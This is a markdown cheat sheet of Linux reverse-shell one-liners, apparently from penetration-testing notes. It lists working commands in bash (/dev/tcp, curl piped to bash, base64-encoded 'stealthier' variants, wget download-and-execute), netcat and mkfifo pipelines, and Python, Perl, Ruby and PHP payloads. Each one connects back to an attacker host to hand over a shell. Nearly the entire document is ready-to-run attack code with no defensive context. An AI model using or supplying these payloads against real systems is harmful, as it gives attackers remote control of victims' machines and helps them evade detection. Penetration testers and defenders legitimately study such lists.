## Linux
### Bash | sh
- curl
```
curl https://reverse-shell.sh/1.1.1.1:3000 | bash
```
- TCP
```
bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1
```
- UDP
```
bash -i >& /dev/udp/127.0.0.1/4242 0>&1
```
- Other
```
0<&196;exec 196<>/dev/tcp/<ATTACKER_IP>/<PORT>; sh <&196 >&196 2>&196
```
```
exec 5<>/dev/tcp/<ATTACKER_IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; done
```
- Short and bypass
```
(sh)0>/dev/tcp/10.10.10.10/9091
# After getting the shell to get the output to execute
exec >&0
```
- Symbol safe shell
```
bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1'
```
- Stealthier Method
```
echo "bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1'" | base64
```
```
echo BASE_64_STRING | base64 -d | bash 2>/dev/null
```
- Create in file and execute
```
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER_IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh
```
```
wget http://<ATTACKER_IP>/<SHELL> -P /tmp; chmod +x /tmp/<SHELL>; /tmp/<SHELL>
```
### Forward Shell
- In cases where you have an RCE iuna web app in a linux machine but due to Iptables rules and other filtering you cannot get a reverse shell
	- This shell allows you to maintain a PTY shell through that RCE using pipes inside the victim system
	- https://github.com/IppSec/forward-shell
- Netcat
```
nc -e /bin/sh <ATTACKER_IP> <PORT>
```
```
# Blind
nc <ATTACKER_IP> <PORT> | /bin/sh
```
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> <PORT> >/tmp/f
```
```
nc <ATTACKER_IP> <PORT1>| /bin/bash | nc <ATTACKER_IP> <PORT2>
```
```
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER_IP> <PORT> 1>/tmp/bkpipe
```
- Python
```
#Linux
export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
```
#IPv6
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");' 
```
- Perl
```
perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
```
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
- Ruby
```
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```
```
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
- PHP
```
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```
```
<?php $sock=fsockopen("10.0.0.1",1234);$proc=proc_open("/bin/sh -i",array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>
```
```
<?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
```
